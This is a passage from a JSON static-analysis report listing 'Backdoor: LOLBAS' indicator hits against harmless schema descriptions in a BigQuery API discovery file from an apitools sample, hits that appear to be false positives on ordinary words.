            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2.json"
                },
                "region": {
                  "startLine": 102,
                  "startColumn": 387,
                  "endLine": 102,
                  "endColumn": 391,
                  "snippet": {
                    "text": "   \"properties\": {\n    \"encoding\": {\n     \"type\": \"string\",\n     \"description\": \"[Optional] The encoding of the values when the type is not STRING. Acceptable encoding values are: TEXT - indicates values are alphanumeric text strings. BINARY - indicates values are encoded using HBase Bytes.toBytes family of functions. 'encoding' can also be set at the column family level. However, the setting at this level takes precedence if 'encoding' is set at both levels.\"\n    },\n    \"fieldName\": {\n     \"type\": \"string\",\n",
                    "rendered": {
                      "text": "   \"properties\": {\n    \"encoding\": {\n     \"type\": \"string\",\n     \"description\": \"[Optional] The encoding of the values when the type is not STRING. Acceptable encoding values are: TEXT - indicates values are alphanumeric text strings. BINARY - indicates values are encoded using HBase Bytes.toBytes family of functions. 'encoding' can also be set at the column family level. However, the setting at this level takes precedence if 'encoding' is set at both levels.\"\n    },\n    \"fieldName\": {\n     \"type\": \"string\",\n",
                      "markdown": "`   \"properties\": {\n    \"encoding\": {\n     \"type\": \"string\",\n     \"description\": \"[Optional] The encoding of the values when the type is not STRING. Acceptable encoding values are: TEXT - indicates values are alphanumeric text strings. BINARY - indicates values are encoded using HBase Bytes.toBytes family of functions. 'encoding' can also be set at the column family level. However, the setting at this level takes precedence if 'encoding' is set at both levels.\"\n    },\n    \"fieldName\": {\n     \"type\": \"string\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2.json"
                },
                "region": {
                  "startLine": 102,
                  "startColumn": 335,
                  "endLine": 102,
                  "endColumn": 339,
                  "snippet": {
                    "text": "   \"properties\": {\n    \"encoding\": {\n     \"type\": \"string\",\n     \"description\": \"[Optional] The encoding of the values when the type is not STRING. Acceptable encoding values are: TEXT - indicates values are alphanumeric text strings. BINARY - indicates values are encoded using HBase Bytes.toBytes family of functions. 'encoding' can also be set at the column family level. However, the setting at this level takes precedence if 'encoding' is set at both levels.\"\n    },\n    \"fieldName\": {\n     \"type\": \"string\",\n",
                    "rendered": {
                      "text": "   \"properties\": {\n    \"encoding\": {\n     \"type\": \"string\",\n     \"description\": \"[Optional] The encoding of the values when the type is not STRING. Acceptable encoding values are: TEXT - indicates values are alphanumeric text strings. BINARY - indicates values are encoded using HBase Bytes.toBytes family of functions. 'encoding' can also be set at the column family level. However, the setting at this level takes precedence if 'encoding' is set at both levels.\"\n    },\n    \"fieldName\": {\n     \"type\": \"string\",\n",
                      "markdown": "`   \"properties\": {\n    \"encoding\": {\n     \"type\": \"string\",\n     \"description\": \"[Optional] The encoding of the values when the type is not STRING. Acceptable encoding values are: TEXT - indicates values are alphanumeric text strings. BINARY - indicates values are encoded using HBase Bytes.toBytes family of functions. 'encoding' can also be set at the column family level. However, the setting at this level takes precedence if 'encoding' is set at both levels.\"\n    },\n    \"fieldName\": {\n     \"type\": \"string\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2.json"
                },
                "region": {
                  "startLine": 102,
                  "startColumn": 286,
                  "endLine": 102,
                  "endColumn": 290,
                  "snippet": {
                    "text": "   \"properties\": {\n    \"encoding\": {\n     \"type\": \"string\",\n     \"description\": \"[Optional] The encoding of the values when the type is not STRING. Acceptable encoding values are: TEXT - indicates values are alphanumeric text strings. BINARY - indicates values are encoded using HBase Bytes.toBytes family of functions. 'encoding' can also be set at the column family level. However, the setting at this level takes precedence if 'encoding' is set at both levels.\"\n    },\n    \"fieldName\": {\n     \"type\": \"string\",\n",
                    "rendered": {
                      "text": "   \"properties\": {\n    \"encoding\": {\n     \"type\": \"string\",\n     \"description\": \"[Optional] The encoding of the values when the type is not STRING. Acceptable encoding values are: TEXT - indicates values are alphanumeric text strings. BINARY - indicates values are encoded using HBase Bytes.toBytes family of functions. 'encoding' can also be set at the column family level. However, the setting at this level takes precedence if 'encoding' is set at both levels.\"\n    },\n    \"fieldName\": {\n     \"type\": \"string\",\n",
                      "markdown": "`   \"properties\": {\n    \"encoding\": {\n     \"type\": \"string\",\n     \"description\": \"[Optional] The encoding of the values when the type is not STRING. Acceptable encoding values are: TEXT - indicates values are alphanumeric text strings. BINARY - indicates values are encoded using HBase Bytes.toBytes family of functions. 'encoding' can also be set at the column family level. However, the setting at this level takes precedence if 'encoding' is set at both levels.\"\n    },\n    \"fieldName\": {\n     \"type\": \"string\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2.json"
                },
                "region": {
                  "startLine": 2302,
                  "startColumn": 63,
                  "endLine": 2302,
                  "endColumn": 69,
                  "snippet": {
                    "text": "     \"id\": \"bigquery.tabledata.insertAll\",\n     \"path\": \"projects/{projectId}/datasets/{datasetId}/tables/{tableId}/insertAll\",\n     \"httpMethod\": \"POST\",\n     \"description\": \"Streams data into BigQuery one record at a time without needing to run a load job. Requires the WRITER dataset role.\",\n     \"parameters\": {\n      \"datasetId\": {\n       \"type\": \"string\",\n",
                    "rendered": {
                      "text": "     \"id\": \"bigquery.tabledata.insertAll\",\n     \"path\": \"projects/{projectId}/datasets/{datasetId}/tables/{tableId}/insertAll\",\n     \"httpMethod\": \"POST\",\n     \"description\": \"Streams data into BigQuery one record at a time without needing to run a load job. Requires the WRITER dataset role.\",\n     \"parameters\": {\n      \"datasetId\": {\n       \"type\": \"string\",\n",
                      "markdown": "`     \"id\": \"bigquery.tabledata.insertAll\",\n     \"path\": \"projects/{projectId}/datasets/{datasetId}/tables/{tableId}/insertAll\",\n     \"httpMethod\": \"POST\",\n     \"description\": \"Streams data into BigQuery one record at a time without needing to run a load job. Requires the WRITER dataset role.\",\n     \"parameters\": {\n      \"datasetId\": {\n       \"type\": \"string\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2.json"
                },
                "region": {
                  "startLine": 2101,
                  "startColumn": 131,
                  "endLine": 2101,
                  "endColumn": 140,
                  "snippet": {
                    "text": "      },\n      \"timeoutMs\": {\n       \"type\": \"integer\",\n       \"description\": \"How long to wait for the query to complete, in milliseconds, before returning. Default is 10 seconds. If the timeout passes before the job completes, the 'jobComplete' field in the response will be false\",\n       \"format\": \"uint32\",\n       \"location\": \"query\"\n      }\n",
                    "rendered": {
                      "text": "      },\n      \"timeoutMs\": {\n       \"type\": \"integer\",\n       \"description\": \"How long to wait for the query to complete, in milliseconds, before returning. Default is 10 seconds. If the timeout passes before the job completes, the 'jobComplete' field in the response will be false\",\n       \"format\": \"uint32\",\n       \"location\": \"query\"\n      }\n",
                      "markdown": "`      },\n      \"timeoutMs\": {\n       \"type\": \"integer\",\n       \"description\": \"How long to wait for the query to complete, in milliseconds, before returning. Default is 10 seconds. If the timeout passes before the job completes, the 'jobComplete' field in the response will be false\",\n       \"format\": \"uint32\",\n       \"location\": \"query\"\n      }\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2.json"
                },
                "region": {
                  "startLine": 1431,
                  "startColumn": 38,
                  "endLine": 1431,
                  "endColumn": 44,
                  "snippet": {
                    "text": "    },\n    \"lastModifiedTime\": {\n     \"type\": \"string\",\n     \"description\": \"[Output-only] The time when this table was last modified, in milliseconds since the epoch.\",\n     \"format\": \"uint64\"\n    },\n    \"location\": {\n",
                    "rendered": {
                      "text": "    },\n    \"lastModifiedTime\": {\n     \"type\": \"string\",\n     \"description\": \"[Output-only] The time when this table was last modified, in milliseconds since the epoch.\",\n     \"format\": \"uint64\"\n    },\n    \"location\": {\n",
                      "markdown": "`    },\n    \"lastModifiedTime\": {\n     \"type\": \"string\",\n     \"description\": \"[Output-only] The time when this table was last modified, in milliseconds since the epoch.\",\n     \"format\": \"uint64\"\n    },\n    \"location\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2.json"
                },
                "region": {
                  "startLine": 1409,
                  "startColumn": 35,
                  "endLine": 1409,
                  "endColumn": 41,
                  "snippet": {
                    "text": "    },\n    \"expirationTime\": {\n     \"type\": \"string\",\n     \"description\": \"[Optional] The time when this table expires, in milliseconds since the epoch. If not present, the table will persist indefinitely. Expired tables will be deleted and their storage reclaimed.\",\n     \"format\": \"int64\"\n    },\n    \"externalDataConfiguration\": {\n",
                    "rendered": {
                      "text": "    },\n    \"expirationTime\": {\n     \"type\": \"string\",\n     \"description\": \"[Optional] The time when this table expires, in milliseconds since the epoch. If not present, the table will persist indefinitely. Expired tables will be deleted and their storage reclaimed.\",\n     \"format\": \"int64\"\n    },\n    \"externalDataConfiguration\": {\n",
                      "markdown": "`    },\n    \"expirationTime\": {\n     \"type\": \"string\",\n     \"description\": \"[Optional] The time when this table expires, in milliseconds since the epoch. If not present, the table will persist indefinitely. Expired tables will be deleted and their storage reclaimed.\",\n     \"format\": \"int64\"\n    },\n    \"externalDataConfiguration\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2.json"
                },
                "region": {
                  "startLine": 1396,
                  "startColumn": 38,
                  "endLine": 1396,
                  "endColumn": 44,
                  "snippet": {
                    "text": "   \"properties\": {\n    \"creationTime\": {\n     \"type\": \"string\",\n     \"description\": \"[Output-only] The time when this table was created, in milliseconds since the epoch.\",\n     \"format\": \"int64\"\n    },\n    \"description\": {\n",
                    "rendered": {
                      "text": "   \"properties\": {\n    \"creationTime\": {\n     \"type\": \"string\",\n     \"description\": \"[Output-only] The time when this table was created, in milliseconds since the epoch.\",\n     \"format\": \"int64\"\n    },\n    \"description\": {\n",
                      "markdown": "`   \"properties\": {\n    \"creationTime\": {\n     \"type\": \"string\",\n     \"description\": \"[Output-only] The time when this table was created, in milliseconds since the epoch.\",\n     \"format\": \"int64\"\n    },\n    \"description\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2.json"
                },
                "region": {
                  "startLine": 1295,
                  "startColumn": 241,
                  "endLine": 1295,
                  "endColumn": 250,
                  "snippet": {
                    "text": "    },\n    \"timeoutMs\": {\n     \"type\": \"integer\",\n     \"description\": \"[Optional] How long to wait for the query to complete, in milliseconds, before the request times out and returns. Note that this is only a timeout for the request, not the query. If the query takes longer to run than the timeout value, the call returns without any results and with the 'jobComplete' flag set to false. You can call GetQueryResults() to wait for the query to complete and read the results. The default value is 10000 milliseconds (10 seconds).\",\n     \"format\": \"uint32\"\n    },\n    \"useLegacySql\": {\n",
                    "rendered": {
                      "text": "    },\n    \"timeoutMs\": {\n     \"type\": \"integer\",\n     \"description\": \"[Optional] How long to wait for the query to complete, in milliseconds, before the request times out and returns. Note that this is only a timeout for the request, not the query. If the query takes longer to run than the timeout value, the call returns without any results and with the 'jobComplete' flag set to false. You can call GetQueryResults() to wait for the query to complete and read the results. The default value is 10000 milliseconds (10 seconds).\",\n     \"format\": \"uint32\"\n    },\n    \"useLegacySql\": {\n",
                      "markdown": "`    },\n    \"timeoutMs\": {\n     \"type\": \"integer\",\n     \"description\": \"[Optional] How long to wait for the query to complete, in milliseconds, before the request times out and returns. Note that this is only a timeout for the request, not the query. If the query takes longer to run than the timeout value, the call returns without any results and with the 'jobComplete' flag set to false. You can call GetQueryResults() to wait for the query to complete and read the results. The default value is 10000 milliseconds (10 seconds).\",\n     \"format\": \"uint32\"\n    },\n    \"useLegacySql\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2.json"
                },
                "region": {
                  "startLine": 1295,
                  "startColumn": 159,
                  "endLine": 1295,
                  "endColumn": 168,
                  "snippet": {
                    "text": "    },\n    \"timeoutMs\": {\n     \"type\": \"integer\",\n     \"description\": \"[Optional] How long to wait for the query to complete, in milliseconds, before the request times out and returns. Note that this is only a timeout for the request, not the query. If the query takes longer to run than the timeout value, the call returns without any results and with the 'jobComplete' flag set to false. You can call GetQueryResults() to wait for the query to complete and read the results. The default value is 10000 milliseconds (10 seconds).\",\n     \"format\": \"uint32\"\n    },\n    \"useLegacySql\": {\n",
                    "rendered": {
                      "text": "    },\n    \"timeoutMs\": {\n     \"type\": \"integer\",\n     \"description\": \"[Optional] How long to wait for the query to complete, in milliseconds, before the request times out and returns. Note that this is only a timeout for the request, not the query. If the query takes longer to run than the timeout value, the call returns without any results and with the 'jobComplete' flag set to false. You can call GetQueryResults() to wait for the query to complete and read the results. The default value is 10000 milliseconds (10 seconds).\",\n     \"format\": \"uint32\"\n    },\n    \"useLegacySql\": {\n",
                      "markdown": "`    },\n    \"timeoutMs\": {\n     \"type\": \"integer\",\n     \"description\": \"[Optional] How long to wait for the query to complete, in milliseconds, before the request times out and returns. Note that this is only a timeout for the request, not the query. If the query takes longer to run than the timeout value, the call returns without any results and with the 'jobComplete' flag set to false. You can call GetQueryResults() to wait for the query to complete and read the results. The default value is 10000 milliseconds (10 seconds).\",\n     \"format\": \"uint32\"\n    },\n    \"useLegacySql\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2.json"
                },
                "region": {
                  "startLine": 1062,
                  "startColumn": 40,
                  "endLine": 1062,
                  "endColumn": 46,
                  "snippet": {
                    "text": "    },\n    \"startTime\": {\n     \"type\": \"string\",\n     \"description\": \"[Output-only] Start time of this job, in milliseconds since the epoch. This field will be present when the job transitions from the PENDING state to either RUNNING or DONE.\",\n     \"format\": \"int64\"\n    },\n    \"totalBytesProcessed\": {\n",
                    "rendered": {
                      "text": "    },\n    \"startTime\": {\n     \"type\": \"string\",\n     \"description\": \"[Output-only] Start time of this job, in milliseconds since the epoch. This field will be present when the job transitions from the PENDING state to either RUNNING or DONE.\",\n     \"format\": \"int64\"\n    },\n    \"totalBytesProcessed\": {\n",
                      "markdown": "`    },\n    \"startTime\": {\n     \"type\": \"string\",\n     \"description\": \"[Output-only] Start time of this job, in milliseconds since the epoch. This field will be present when the job transitions from the PENDING state to either RUNNING or DONE.\",\n     \"format\": \"int64\"\n    },\n    \"totalBytesProcessed\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2.json"
                },
                "region": {
                  "startLine": 1045,
                  "startColumn": 38,
                  "endLine": 1045,
                  "endColumn": 44,
                  "snippet": {
                    "text": "    },\n    \"endTime\": {\n     \"type\": \"string\",\n     \"description\": \"[Output-only] End time of this job, in milliseconds since the epoch. This field will be present whenever a job is in the DONE state.\",\n     \"format\": \"int64\"\n    },\n    \"extract\": {\n",
                    "rendered": {
                      "text": "    },\n    \"endTime\": {\n     \"type\": \"string\",\n     \"description\": \"[Output-only] End time of this job, in milliseconds since the epoch. This field will be present whenever a job is in the DONE state.\",\n     \"format\": \"int64\"\n    },\n    \"extract\": {\n",
                      "markdown": "`    },\n    \"endTime\": {\n     \"type\": \"string\",\n     \"description\": \"[Output-only] End time of this job, in milliseconds since the epoch. This field will be present whenever a job is in the DONE state.\",\n     \"format\": \"int64\"\n    },\n    \"extract\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2.json"
                },
                "region": {
                  "startLine": 1040,
                  "startColumn": 43,
                  "endLine": 1040,
                  "endColumn": 49,
                  "snippet": {
                    "text": "   \"properties\": {\n    \"creationTime\": {\n     \"type\": \"string\",\n     \"description\": \"[Output-only] Creation time of this job, in milliseconds since the epoch. This field will be present on all jobs.\",\n     \"format\": \"int64\"\n    },\n    \"endTime\": {\n",
                    "rendered": {
                      "text": "   \"properties\": {\n    \"creationTime\": {\n     \"type\": \"string\",\n     \"description\": \"[Output-only] Creation time of this job, in milliseconds since the epoch. This field will be present on all jobs.\",\n     \"format\": \"int64\"\n    },\n    \"endTime\": {\n",
                      "markdown": "`   \"properties\": {\n    \"creationTime\": {\n     \"type\": \"string\",\n     \"description\": \"[Output-only] Creation time of this job, in milliseconds since the epoch. This field will be present on all jobs.\",\n     \"format\": \"int64\"\n    },\n    \"endTime\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2.json"
                },
                "region": {
                  "startLine": 986,
                  "startColumn": 99,
                  "endLine": 986,
                  "endColumn": 105,
                  "snippet": {
                    "text": "       },\n       \"statistics\": {\n        \"$ref\": \"JobStatistics\",\n        \"description\": \"[Output-only] Information about the job, including starting time and ending time of the job.\"\n       },\n       \"status\": {\n        \"$ref\": \"JobStatus\",\n",
                    "rendered": {
                      "text": "       },\n       \"statistics\": {\n        \"$ref\": \"JobStatistics\",\n        \"description\": \"[Output-only] Information about the job, including starting time and ending time of the job.\"\n       },\n       \"status\": {\n        \"$ref\": \"JobStatus\",\n",
                      "markdown": "`       },\n       \"statistics\": {\n        \"$ref\": \"JobStatistics\",\n        \"description\": \"[Output-only] Information about the job, including starting time and ending time of the job.\"\n       },\n       \"status\": {\n        \"$ref\": \"JobStatus\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2.json"
                },
                "region": {
                  "startLine": 986,
                  "startColumn": 83,
                  "endLine": 986,
                  "endColumn": 89,
                  "snippet": {
                    "text": "       },\n       \"statistics\": {\n        \"$ref\": \"JobStatistics\",\n        \"description\": \"[Output-only] Information about the job, including starting time and ending time of the job.\"\n       },\n       \"status\": {\n        \"$ref\": \"JobStatus\",\n",
                    "rendered": {
                      "text": "       },\n       \"statistics\": {\n        \"$ref\": \"JobStatistics\",\n        \"description\": \"[Output-only] Information about the job, including starting time and ending time of the job.\"\n       },\n       \"status\": {\n        \"$ref\": \"JobStatus\",\n",
                      "markdown": "`       },\n       \"statistics\": {\n        \"$ref\": \"JobStatistics\",\n        \"description\": \"[Output-only] Information about the job, including starting time and ending time of the job.\"\n       },\n       \"status\": {\n        \"$ref\": \"JobStatus\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2.json"
                },
                "region": {
                  "startLine": 812,
                  "startColumn": 57,
                  "endLine": 812,
                  "endColumn": 62,
                  "snippet": {
                    "text": "    },\n    \"skipLeadingRows\": {\n     \"type\": \"integer\",\n     \"description\": \"[Optional] The number of rows at the top of a CSV file that BigQuery will skip when loading the data. The default value is 0. This property is useful if you have header rows in the file that should be skipped.\",\n     \"format\": \"int32\"\n    },\n    \"sourceFormat\": {\n",
                    "rendered": {
                      "text": "    },\n    \"skipLeadingRows\": {\n     \"type\": \"integer\",\n     \"description\": \"[Optional] The number of rows at the top of a CSV file that BigQuery will skip when loading the data. The default value is 0. This property is useful if you have header rows in the file that should be skipped.\",\n     \"format\": \"int32\"\n    },\n    \"sourceFormat\": {\n",
                      "markdown": "`    },\n    \"skipLeadingRows\": {\n     \"type\": \"integer\",\n     \"description\": \"[Optional] The number of rows at the top of a CSV file that BigQuery will skip when loading the data. The default value is 0. This property is useful if you have header rows in the file that should be skipped.\",\n     \"format\": \"int32\"\n    },\n    \"sourceFormat\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2.json"
                },
                "region": {
                  "startLine": 646,
                  "startColumn": 96,
                  "endLine": 646,
                  "endColumn": 102,
                  "snippet": {
                    "text": "    },\n    \"statistics\": {\n     \"$ref\": \"JobStatistics\",\n     \"description\": \"[Output-only] Information about the job, including starting time and ending time of the job.\"\n    },\n    \"status\": {\n     \"$ref\": \"JobStatus\",\n",
                    "rendered": {
                      "text": "    },\n    \"statistics\": {\n     \"$ref\": \"JobStatistics\",\n     \"description\": \"[Output-only] Information about the job, including starting time and ending time of the job.\"\n    },\n    \"status\": {\n     \"$ref\": \"JobStatus\",\n",
                      "markdown": "`    },\n    \"statistics\": {\n     \"$ref\": \"JobStatistics\",\n     \"description\": \"[Output-only] Information about the job, including starting time and ending time of the job.\"\n    },\n    \"status\": {\n     \"$ref\": \"JobStatus\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2.json"
                },
                "region": {
                  "startLine": 646,
                  "startColumn": 80,
                  "endLine": 646,
                  "endColumn": 86,
                  "snippet": {
                    "text": "    },\n    \"statistics\": {\n     \"$ref\": \"JobStatistics\",\n     \"description\": \"[Output-only] Information about the job, including starting time and ending time of the job.\"\n    },\n    \"status\": {\n     \"$ref\": \"JobStatus\",\n",
                    "rendered": {
                      "text": "    },\n    \"statistics\": {\n     \"$ref\": \"JobStatistics\",\n     \"description\": \"[Output-only] Information about the job, including starting time and ending time of the job.\"\n    },\n    \"status\": {\n     \"$ref\": \"JobStatus\",\n",
                      "markdown": "`    },\n    \"statistics\": {\n     \"$ref\": \"JobStatistics\",\n     \"description\": \"[Output-only] Information about the job, including starting time and ending time of the job.\"\n    },\n    \"status\": {\n     \"$ref\": \"JobStatus\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2.json"
                },
                "region": {
                  "startLine": 610,
                  "startColumn": 57,
                  "endLine": 610,
                  "endColumn": 62,
                  "snippet": {
                    "text": ". Present only when the query completes successfully.\",\n     \"format\": \"uint64\"\n    }\n   }\n  },\n  \"GoogleSheetsOptions\": {\n   \"id\": \"GoogleSheetsOptions\",\n   \"type\": \"object\",\n   \"properties\": {\n    \"skipLeadingRows\": {\n     \"type\": \"string\",\n     \"description\": \"[Optional] The number of rows at the top of a sheet that BigQuery will skip when reading the data. The default value is 0. This property is useful if you have header rows that should be skipped. When autodetect is on, behavior is the following: * skipLeadingRows unspecified - Autodetect tries to detect headers in the first row. If they are",
                    "rendered": {
                      "text": ". Present only when the query completes successfully.\",\n     \"format\": \"uint64\"\n    }\n   }\n  },\n  \"GoogleSheetsOptions\": {\n   \"id\": \"GoogleSheetsOptions\",\n   \"type\": \"object\",\n   \"properties\": {\n    \"skipLeadingRows\": {\n     \"type\": \"string\",\n     \"description\": \"[Optional] The number of rows at the top of a sheet that BigQuery will skip when reading the data. The default value is 0. This property is useful if you have header rows that should be skipped. When autodetect is on, behavior is the following: * skipLeadingRows unspecified - Autodetect tries to detect headers in the first row. If they are",
                      "markdown": "`. Present only when the query completes successfully.\",\n     \"format\": \"uint64\"\n    }\n   }\n  },\n  \"GoogleSheetsOptions\": {\n   \"id\": \"GoogleSheetsOptions\",\n   \"type\": \"object\",\n   \"properties\": {\n    \"skipLeadingRows\": {\n     \"type\": \"string\",\n     \"description\": \"[Optional] The number of rows at the top of a sheet that BigQuery will skip when reading the data. The default value is 0. This property is useful if you have header rows that should be skipped. When autodetect is on, behavior is the following: * skipLeadingRows unspecified - Autodetect tries to detect headers in the first row. If they are`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
